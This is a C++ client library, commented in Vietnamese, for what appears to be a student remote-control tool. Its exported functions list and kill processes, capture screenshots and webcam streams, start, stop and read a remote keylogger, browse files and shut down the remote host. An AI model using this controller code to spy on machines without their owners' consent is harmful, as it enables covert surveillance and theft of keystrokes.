#include "ClientLib.h"
#include <ws2tcpip.h>
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h> 

using namespace std;

SOCKET clientSocket = INVALID_SOCKET;
const int SERVER_PORT = 5656;

// ==========================================
//      CÁC HÀM HỖ TRỢ NỘI BỘ 
// ==========================================

void sendCommandInternal(string command) {
    if (clientSocket == INVALID_SOCKET) return;
    string dataToSend = command + "\n"; 
    send(clientSocket, dataToSend.c_str(), (int)dataToSend.length(), 0);
}

string receiveLine() {
    string line = "";
    char c;
    while (true) {
        int r = recv(clientSocket, &c, 1, 0);
        if (r <= 0) break;
        if (c == '\n') break;
        if (c != '\r') line += c; 
    }
    return line;
}

// ==========================================
//      CÁC HÀM CHỨC NĂNG (Dùng chung)
// ==========================================

ProcessMap receiveProcessListInternal(bool isApp) {
    ProcessMap myMap;
    DWORD timeout = 15000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) { return myMap; }

    for (int i = 0; i < count; i++) {
        string name = receiveLine();
        if (isApp) {
            if (name == "ok") {
                name = receiveLine();
                string id = receiveLine();
                string threads = receiveLine();
                if (myMap.find(id) == myMap.end()) myMap[id] = {name, id, threads};
            } else continue;
        } else {
            string id = receiveLine();
            string threads = receiveLine();
            if (myMap.find(id) == myMap.end()) myMap[id] = {name, id, threads};
        }
    }
    return myMap;
}

void receiveImageResponseInternal() {
    string sizeStr = receiveLine();
    int imageSize = 0;
    try { imageSize = stoi(sizeStr); } catch (...) { return; }
    if (imageSize == 0) return;

    ofstream file("screenshot.bmp", ios::binary);
    char* buffer = new char[4096];
    int remaining = imageSize;
    
    DWORD timeout = 10000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (remaining > 0) {
        int r = recv(clientSocket, buffer, (remaining < 4096) ? remaining : 4096, 0);
        if (r <= 0) break;
        file.write(buffer, r);
        remaining -= r;
    }
    delete[] buffer;
    file.close();
}

// Các hàm wrapper cho Console App
void connectToServer() {
    string ip;
    cout << "IP: "; getline(cin, ip);
    if(ip.empty()) ip = "127.0.0.1";
    ConnectToIP(ip.c_str());
}
void sendCommand(string cmd) { sendCommandInternal(cmd); }
ProcessMap receiveProcessList(bool isApp) { return receiveProcessListInternal(isApp); }
void receiveImageResponse() { receiveImageResponseInternal(); }
void receiveTextResponse() { /* Logic cũ của bạn */ }


// ==========================================
//      CÁC HÀM XUẤT KHẨU (CHO PYTHON)
// ==========================================

DLLEXPORT void InitWinsock() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
}

DLLEXPORT void ConnectToIP(const char* ip) {
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = inet_addr(ip);
    connect(clientSocket, (sockaddr*)&addr, sizeof(addr));
}

DLLEXPORT void CloseConnection() {
    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);
    WSACleanup();
}

// 1. Hàm gửi lệnh bất kỳ
DLLEXPORT void SendStringCmd(const char* cmd) {
    if (clientSocket != INVALID_SOCKET) {
        sendCommandInternal(string(cmd));
    }
}

// 2. Hàm lấy Apps -> Ghi ra file apps.txt
DLLEXPORT void GetAppList() {
    sendCommandInternal("APPLICATION"); Sleep(500);
    sendCommandInternal("XEM");
    ProcessMap list = receiveProcessListInternal(true);
    
    ofstream out("apps.txt");
    for (auto const& [id, info] : list) {
        out << id << "|" << info.name << "|" << info.threadCount << "\n";
    }
    out.close();
    sendCommandInternal("QUIT");
}

// 3. Hàm lấy Process -> Ghi ra file process.txt
DLLEXPORT void GetProcessList() {
    sendCommandInternal("PROCESS"); Sleep(500);
    sendCommandInternal("XEM");
    ProcessMap list = receiveProcessListInternal(false);
    
    ofstream out("process.txt");
    for (auto const& [id, info] : list) {
        out << id << "|" << info.name << "|" << info.threadCount << "\n";
    }
    out.close();
    sendCommandInternal("QUIT");
}

// 4. Hàm chụp ảnh -> Ghi ra screenshot.bmp
DLLEXPORT void CaptureScreen() {
    sendCommandInternal("TAKEPIC"); Sleep(500);
    sendCommandInternal("TAKE");
    receiveImageResponseInternal();
    sendCommandInternal("QUIT");
}

// 5. Hàm quay Video (Stream) - Python có thể gọi cái này
DLLEXPORT void ReceiveVideoStream(int duration) {
    if (clientSocket == INVALID_SOCKET) return;

    // ... (Giữ nguyên logic quay video như file trước) ...
    // Để cho gọn, mình tóm tắt lại:
    sendCommandInternal("VIDEO"); Sleep(200);
    string start = "START"; 
    if(duration > 0) start += " " + to_string(duration);
    sendCommandInternal(start);

    const int MAX_BUFFER = 500*1024;
    char* buffer = new char[MAX_BUFFER];
    
    while(true) {
        string head = receiveLine();
        if(head == "STOPPED" || head == "TIMEOUT" || head == "QUIT" || head.empty()) break;
        int size = 0;
        try { size = stoi(head); } catch(...) { continue; }
        if(size > MAX_BUFFER) continue;

        int received = 0; 
        int remain = size;
        while(remain > 0) {
            int r = recv(clientSocket, buffer + received, remain, 0);
            if(r<=0) break;
            received += r; remain -= r;
        }
        
        ofstream file("live.jpg", ios::binary);
        if(file.is_open()) { file.write(buffer, received); file.close(); }
    }
    delete[] buffer;
    sendCommandInternal("QUIT");
}

DLLEXPORT void KillProcess(const char* pid) {
    if (clientSocket == INVALID_SOCKET) return;

    // Server yêu cầu quy trình: PROCESS -> KILL -> KILLID -> [ID]
    sendCommandInternal("PROCESS"); Sleep(100);
    sendCommandInternal("KILL");    Sleep(100);
    sendCommandInternal("KILLID");  Sleep(50);
    
    sendCommandInternal(pid); // Gửi ID cần diệt
    
    // Đọc phản hồi từ Server ("Đã diệt..." hoặc "Lỗi")
    // Cần đọc để dọn sạch bộ đệm socket
    string response = receiveLine(); 
    
    // Thoát ra
    sendCommandInternal("QUIT"); // Thoát chế độ KILL
    sendCommandInternal("QUIT"); // Thoát chế độ PROCESS
}

DLLEXPORT void StartProcess(const char* name) {
    if (clientSocket == INVALID_SOCKET) return;

    // Quy trình: PROCESS -> START -> STARTID -> [NAME]
    // Lưu ý: Server dùng chung module PROCESS để Start app
    sendCommandInternal("PROCESS"); Sleep(100);
    sendCommandInternal("START");   Sleep(100);
    sendCommandInternal("STARTID"); Sleep(50);
    
    sendCommandInternal(name); // Gửi tên (vd: notepad)
    
    string response = receiveLine(); // Đọc phản hồi
    
    sendCommandInternal("QUIT"); // Thoát chế độ START
    sendCommandInternal("QUIT"); // Thoát chế độ PROCESS
}

DLLEXPORT void HookKeylog() {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("HOOK");   Sleep(100);
    sendCommandInternal("QUIT");
}

// --- KEYLOGGER: DỪNG THEO DÕI ---
DLLEXPORT void UnhookKeylog() {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("UNHOOK"); Sleep(100);
    sendCommandInternal("QUIT");
}

// --- KEYLOGGER: LẤY DỮ LIỆU ---
DLLEXPORT void GetKeylog() {
    if (clientSocket == INVALID_SOCKET) return;
    
    sendCommandInternal("KEYLOG"); Sleep(100);
    sendCommandInternal("PRINT"); 
    
    // Nhận dữ liệu text từ Server
    ofstream file("keylog.txt");
    DWORD timeout = 2000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    
    char buffer[4096];
    while (true) {
        int r = recv(clientSocket, buffer, 4095, 0);
        if (r <= 0) break;
        buffer[r] = '\0';
        file << buffer; // Ghi vào file
    }
    file.close();
    
    sendCommandInternal("QUIT");
}

DLLEXPORT void ReceiveWebcamStream() {
    if (clientSocket == INVALID_SOCKET) {
        cout << "[LOI] Chua ket noi Server!" << endl;
        return;
    }

    // 1. Gửi lệnh vào chế độ WEBCAM
    sendCommandInternal("WEBCAM");
    Sleep(200); // Chờ Server khởi động Camera (thường mất 1 tí)

    // 2. Gửi lệnh BẮT ĐẦU
    sendCommandInternal("START");

    cout << "\n[Client] Dang nhan Webcam Stream..." << endl;
    cout << "Mo file 'webcam.jpg' de xem!" << endl;

    // Bộ đệm 500KB (Ảnh Webcam thường nhẹ hơn màn hình)
    const int MAX_BUFFER = 500 * 1024; 
    char* buffer = new char[MAX_BUFFER];
    int frameCount = 0;

    // Timeout 3s (Webcam có thể delay)
    DWORD timeout = 3000;
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (true) {
        // A. Đọc Header (Kích thước ảnh)
        string header = receiveLine();
        
        // Kiểm tra tín hiệu dừng từ Server hoặc Lỗi
        if (header == "STOPPED" || header == "QUIT" || header.empty()) {
            cout << "\n[Client] Dung Webcam." << endl;
            break;
        }

        int imageSize = 0;
        try { 
            imageSize = stoi(header); 
        } catch (...) { 
            continue; // Bỏ qua frame lỗi header
        }

        if (imageSize == 0) {
            cout << "\r[CANH BAO] Server gui anh rong (0 byte) - Kiem tra lai Server STA!" << "   ";
            continue; 
        }

        // B. Nhận dữ liệu ảnh JPEG
        int totalReceived = 0;
        int remaining = imageSize;
        bool error = false;

        while (remaining > 0) {
            int canRead = (remaining < 4096) ? remaining : 4096;
            int r = recv(clientSocket, buffer + totalReceived, canRead, 0);
            if (r <= 0) { 
                error = true; 
                break; 
            }
            totalReceived += r;
            remaining -= r;
        }

        if (error) {
            cout << "[LOI] Mat ket noi khi nhan Webcam." << endl;
            break;
        }

        // C. Ghi đè vào file webcam.jpg
        ofstream file("webcam.jpg", ios::binary);
        if (file.is_open()) {
            file.write(buffer, totalReceived);
            file.flush(); // Đẩy dữ liệu ra đĩa ngay lập tức
            file.close();
        }
    }

    delete[] buffer;
    
    // Gửi lệnh QUIT để thoát chế độ Webcam trên Server
    sendCommandInternal("QUIT");
    cout << "\n[Client] Ket thuc Webcam." << endl;
}

DLLEXPORT void GetDrives() {
    if (clientSocket == INVALID_SOCKET) return;

    sendCommandInternal("EXPLORER"); Sleep(100);
    sendCommandInternal("GET_DRIVES");

    ofstream file("explorer.txt");
    
    // Đọc số lượng
    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) {}

    for (int i = 0; i < count; i++) {
        string line = receiveLine();
        file << line << "\n";
    }
    file.close();
    
    sendCommandInternal("QUIT");
}

// --- HÀM DUYỆT THƯ MỤC ---
DLLEXPORT void ExplorePath(const char* path) {
    if (clientSocket == INVALID_SOCKET) return;

    sendCommandInternal("EXPLORER"); Sleep(100);
    sendCommandInternal("GET_DIR");
    sendCommandInternal(path); // Gửi đường dẫn muốn xem

    ofstream file("explorer.txt");
    
    string countStr = receiveLine();
    int count = 0;
    try { count = stoi(countStr); } catch (...) {}

    for (int i = 0; i < count; i++) {
        string line = receiveLine();
        file << line << "\n";
    }
    file.close();

    sendCommandInternal("QUIT");
}
// --- SHUTDOWN ---
DLLEXPORT void ShutdownServer() {
    if (clientSocket == INVALID_SOCKET) return;
    sendCommandInternal("SHUTDOWN");
}